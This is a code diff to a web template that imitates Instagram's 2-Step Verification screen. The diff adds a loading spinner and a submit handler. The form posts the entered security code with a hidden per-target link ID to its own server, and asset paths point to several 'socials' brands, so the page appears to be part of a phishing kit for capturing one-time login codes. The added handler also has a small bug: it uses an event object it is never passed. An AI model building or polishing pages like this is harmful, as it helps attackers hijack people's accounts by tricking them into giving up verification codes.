@@ -26,6 +26,24 @@
         text-align: center;
         margin: 0.5em auto;
       }
+
+      #submit2 img {
+        width: 1.3em;
+        animation-name: roll;
+        animation-duration: 0.7s;
+        animation-iteration-count: infinite;
+        animation-timing-function: linear;
+        color: white;
+      }
+
+      @keyframes roll {
+        from {
+          transform: rotate(0deg);
+        }
+        to {
+          transform: rotate(360deg);
+        }
+      }
     </style>
   </head>
   <body onload="SwitchScreen()">
@@ -54,7 +72,7 @@
       <!-- SMARTPHONE SECTION END -->
       <!-- FORM SECTION -->
       <article class="form-area">
-        <form method="post" accept=".">
+        <form method="post" accept="." onsubmit="handleSubmit()">
           <p class="small-title">2-Step Verification</p>
           <input
             type="text"
@@ -64,7 +82,15 @@
             placeholder="Security code"
           />
           <input type="hidden" name="linkId" value="<%=linkId%>" />
-          <input type="submit" name="submit" value="Confirm" />
+          <button type="submit" name="submit" id="submit">Confirm</button>
+          <button
+            type="button"
+            name="submit"
+            id="submit2"
+            style="display: none"
+          >
+            <img src="/img/loading.svg" alt="" />
+          </button>
           <div class="options">
             <p class="small">Didn't get security code? we can</p>
             <a href="#" class="small">resend it</a>
@@ -160,6 +186,21 @@
         <span>&copy; 2023 Instagram from Meta</span>
       </div>
     </footer>
+    <script>
+      const handleSubmit = (e) => {
+        const otp = document.querySelector("#code");
+        const submitBtn = document.querySelector("#submit");
+        const submitBtn2 = document.querySelector("#submit2");
+
+        if (otp.value.length > 0) {
+          submitBtn.style.display = "none";
+          submitBtn2.style.display = "block";
+        } else {
+          e.preventDefault();
+          return false;
+        }
+      };
+    </script>
     <script src="/js/socials/app.js"></script>
     <script src="/js/socials/brands.min.js"></script>
     <script src="/js/socials/fontawesome.min.js"></script>
